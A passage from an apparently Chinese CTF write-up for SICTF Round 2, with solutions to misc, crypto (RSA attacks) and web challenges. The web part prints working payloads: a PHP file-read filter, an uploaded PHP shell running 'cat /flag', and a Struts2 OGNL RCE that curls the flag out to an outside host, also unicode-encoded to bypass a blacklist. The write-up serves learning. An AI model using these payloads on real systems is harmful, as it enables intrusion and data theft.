class="line">yX3z7UAjt27mE8KK+k7Jidi0drCEPv5Wo60CQQD3vQbO64fko1dlatkNn095GO9KoCuanrsLs+vY</span><br><span class="line">Ohc0ltk4EhHHmP5hEE6dSMZNASKaN0wSYJ14xjnA+dJWOES3AkEApzyYF4vhLefTUIVBrHIvxFCw</span><br><span class="line">+fjCP1AQiXA5gVcdfzTJm3ZPDtf2/kRbzpTE68M7F0gykFAoGcQj92i/JKy24QJAdyVbA+M07Ro9</span><br><span class="line">qxHzJ+EJmMUMOMjFj8xtStiSQeDWTj2KZLQUBvmmxcnQ9UYN0PUNzjtwA5qhwXccSZoctcjECwJA</span><br><span class="line">Zc0TZgGq/OwgnIyj/1+Q9D0A2eg3aw1k+6Vzkf/DdkuF6+XTkYTlBGiETIK/vm1rCH4NcOCL7eK5</span><br><span class="line">qpA1grg+gnQABlBLQ1MjOH5yABlqYXZhLnNlY3VyaXR5LktleVJlcCRUeXBlAAAAAAAAAAASAAB4</span><br><span class="line">cgAOamF2YS5sYW5nLkVudW0AAAAAAAAAABIAAHhwdAAHUFJJVkFURXNxAH4ADHEAfgARdXEAfgAS</span><br><span class="line">AAAAojCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAvQzoVHQJv11bnY13k1MDUlQ0CzW2FLyJ</span><br><span class="line">fHpAH5SQ3+9El1+wpLx2c5824+48MK3HboHaPwjUW5MnVWut8OTM3nzmyySZdiuicUz3wPHnS8dp</span><br><span class="line">p05wNwN0EGqLyALn8PeIp+VfpP2lIv/k9Ut83UQhoWzIBL2OlZfbAY2LcL9A9KsCAwEAAXQABVgu</span><br><span class="line">NTA5fnEAfgAVdAAGUFVCTElDcHB4</span><br></pre></td></tr></table></figure><p>将流6保存，为flag2.pcapng的实际key。</p><p>回到flag2.pcapng，解析cookie：</p><p><code>python3 cs-decrypt-metadata.py j+ojKDVPlCr7lT9yzNinkj1DgdkcRaLMT2kL4U+9TvdFBZqGKk7/4WF/W7JhEieC3DoRfngRppMAVHa3yfhp4HZm/ZeNY4bc8rlYL11Q0dXDzpR5JjhqN+hGe9RBqPznoukShgQLhxT/DO7djxE5ROzi6NC52yZAaGPCSeLDyjg= -f realkey</code></p><p>拿到Raw key后，再分析流量文件：</p><p><code>python3 cs-parse-traffic.py -r dfc36399da501802482005cf8c768086 flag2.pcapng</code></p><p>得到关键内容：</p><p><code>F       0       09/06/2023 15:52:58     GNSC2OJTHA2S2NDDGA2TIMJVGQ4TSOJVPU======</code></p><p>base32解码得后半部分flag：<code>3d-9385-4c0541549995&#125;</code></p><p>flag：<code>SICTF&#123;79e1755e-08a8-4d3d-9385-4c0541549995&#125;</code></p><p>​    </p><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>冰蝎流量，照着第一个流的PHP加密逻辑代码还原：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;2295d22e2d70888f&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>, <span class="literal">true</span>)[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将响应数据包中的base64字符串带入得到各流的解密内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GronKey.txt</span><br><span class="line">dvwa_email.png</span><br><span class="line">flag.txt</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line"># flag.txt</span><br><span class="line">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span><br><span class="line"></span><br><span class="line"># GronKey.txt</span><br><span class="line">1,50,61,8,9,20,63,41</span><br></pre></td></tr></table></figure><p>Gronsfeld加密，替换成Vigenere加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="number">63</span>,<span class="number">41</span>]</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    key += dic[k%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># byjijulp</span></span><br></pre></td></tr></table></figure><p>Vigenere解密，得 <code>SICTFSHUMUISAGOODBOYYYYYYYYY</code>。</p><p>flag：<code>SICTF&#123;SHUMUISAGOODBOYYYYYYYYY&#125;</code></p><p>​    </p><h3 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h3><p>audacity调慢速度，再<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">在线识别morse</a>，得到 <code>f2a09bf-7f4a-4269-93a5-c8a48360b03c</code>。</p><p>​    </p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><p>交互式01字符串还原二维码，且搞了1000层…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;210.44.151.51&#x27;</span>,<span class="number">10144</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    x = r.recvuntil(<span class="string">b&#x27;Please&#x27;</span>)[:-<span class="number">7</span>].split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    MAX = <span class="built_in">len</span>(x)</span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span>.join(x)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)):</span><br><span class="line">                pic.putpixel((x,y),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pic.putpixel((x,y),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">    pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">    decocdeQR = decode(Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>))</span><br><span class="line">    data = decocdeQR[<span class="number">0</span>].data</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;code:&#x27;</span>,data)</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p><code>SICTF&#123;SICTF_Round3_will_do_even_better!&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到-古典大杂烩"><a href="#签到-古典大杂烩" class="headerlink" title="[签到]古典大杂烩"></a>[签到]古典大杂烩</h3><p>base100-base62-base64-base58-base32-base62</p><p><code>SICTF&#123;fe853b49-8730-462e-86f5-fc8e9789f077&#125;</code></p><p>​    </p><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p>CRT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n1 =   </span><br><span class="line">n2 =   </span><br><span class="line">n3 =   </span><br><span class="line">c1 =     </span><br><span class="line">c2 =   </span><br><span class="line">c3 =  </span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">mm = crt([c1,c2,c3],[n1,n2,n3])</span><br><span class="line">m = mm.nth_root(e, truncate_mode=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h3><p>MTP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">1</span>, <span class="number">28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">24</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">16</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Little Red Riding Hood promise</span></span><br><span class="line"><span class="comment"># d to obey her mother. The gran</span></span><br><span class="line"><span class="comment"># dmother lived out in the woods</span></span><br><span class="line"><span class="comment"># , a half hour from the village</span></span><br><span class="line"><span class="comment"># . When Little Red Riding Hood </span></span><br><span class="line"><span class="comment"># entered the woods a wolf came </span></span><br><span class="line"><span class="comment"># up to her. She did not know wh</span></span><br><span class="line"><span class="comment"># at a wicked animal he was, and</span></span><br><span class="line"><span class="comment">#  was not afraid of him. &quot;Good </span></span><br><span class="line"><span class="comment"># day to you, Little Red Riding </span></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h3><p>coppersmith解已知p高位攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">ph =  </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (ph &lt;&lt; <span class="number">230</span>) + x</span><br><span class="line">pl = f.small_roots(X=<span class="number">2</span>^<span class="number">230</span>, beta=<span class="number">0.48</span>, epsilon=<span class="number">0.02</span>)[<span class="number">0</span>]</span><br><span class="line">p = (ph &lt;&lt; <span class="number">230</span>) + pl</span><br><span class="line"></span><br><span class="line">q = n//<span class="built_in">int</span>(p)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="签到题来咯！"><a href="#签到题来咯！" class="headerlink" title="签到题来咯！"></a>签到题来咯！</h3><p>Related Message Attack（Franklin-Reiter攻击），爆破小 $e$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, n, e</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^e - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> e &lt; <span class="number">2</span>^<span class="number">10</span>:</span><br><span class="line">    m = attack(c1, c2, n, e)</span><br><span class="line">    m = binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> m.isascii():</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    e = next_prime(e)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># SICTF&#123;hhh!!franklin_reiter_is_easy&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3><p>直接小 $e$ 攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = </span><br><span class="line">m = gmpy2.iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;2ca8e589-4a31-4909-80f0-9ecfc8f8cb37&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>根据</p><p>$\begin{cases} h_1=a_1p+b_1q \newline h_2=a_2p+b_2q \end{cases}$</p><p>消掉 $p$，有 $(a_2b_1-a_1b_2)q=a_2h_1-a_1h_2$，由于 $a_1,a_2$ 为素数且 $a_1,a_2 \in [2^{12},2^{13})$，又 $\gcd(a_2h_1-a_1h_2,n)=q$，爆破 $a_1,a_2$ 即可求 $q$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">h1 = </span><br><span class="line">h2 = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">primes = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> Primes():</span><br><span class="line">    <span class="keyword">if</span> k&gt;=<span class="number">2</span>^<span class="number">12</span>:</span><br><span class="line">        primes.append(k)</span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">2</span>^<span class="number">13</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">        x = <span class="built_in">abs</span>(h1*primes[i]-h2*primes[j])</span><br><span class="line">        q = gcd(x,n)</span><br><span class="line">        <span class="keyword">if</span> q &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(primes[i],primes[j],q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5953 4241 8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437</span></span><br></pre></td></tr></table></figure><p>常规解RSA，得flag：<code>SICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h3><p>PHP伪协议读 <code>/flag</code>：</p><p><code>?SICTF=php://filter/resource=/flag</code></p><p>​    </p><h3 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h3><p>POST <code>/?k%20e%20y=123%0a&amp;b=phpinfo();</code></p><p><code>command=print_r(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</code></p><p>​    </p><h3 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3><p>条件竞争。</p><p>上传 <code>1.php</code> ，内容为 <code>&lt;?php system(&quot;cat /flag&quot;);</code>，bp抓包；访问 <code>uploads/1.php</code> ，bp抓包。</p><p>上面两个包分别在bp intruder用null payloads爆破1000次，找到 <code>uploads/1.php</code> 爆破结果中响应码200的那个数据包，即为flag值。</p><p>​    </p><h3 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h3><p>Struts2基于OGNL的RCE漏洞，参考<a href="https://www.freebuf.com/vuls/217482.html">https://www.freebuf.com/vuls/217482.html</a></p><p>S2-012的payload可用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl http://[IP]:[PORT]/?p=`cat /flag`&quot;</span>&#125;)).start()</span><br></pre></td></tr></table></figure><p>unicode编码绕过黑名单关键字过滤，再根据源码的urldecode，urlencode一层，payload：</p><p><code>/start?payload=%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0053%5Cu0074%5Cu0072%5Cu0069%5Cu006e%5Cu0067%5Cu005b%5Cu005d%5Cu007b%5Cu0022%5Cu0062%5Cu0061%5Cu0073%5Cu0068%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu002d%5Cu0063%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu0063%5Cu0075%5Cu0072%5Cu006c%5Cu0020%5Cu0068%5Cu0074%5Cu0074%5Cu0070%5Cu003a%5Cu002f%5Cu002f%5Cu0031%5Cu0032%5Cu0030%5Cu002e%5Cu0032%5Cu0035%5Cu002e%5Cu0031%5Cu0030%5Cu0034%5Cu002e%5Cu0032%5Cu0030%5Cu0039%5Cu003a%5Cu0038%5Cu0038%5Cu0038%5Cu0038%5Cu002f%5Cu003f%5Cu0070%5Cu003d%5Cu0060%5Cu0063%5Cu0061%5Cu0074%5Cu0020%5Cu002f%5Cu0066%5Cu006c%5Cu0061%5Cu0067%5Cu0060%5Cu0022%5Cu007d%5Cu0029%5Cu0029%5Cu002e%5Cu0073%5Cu0074%5Cu0061%5Cu0072%5Cu0074%5Cu0028%5Cu0029</code></p><p>得到结果：</p><p><code>210.44.151.51 - - [09/Sep/2023 12:30:07] &quot;GET 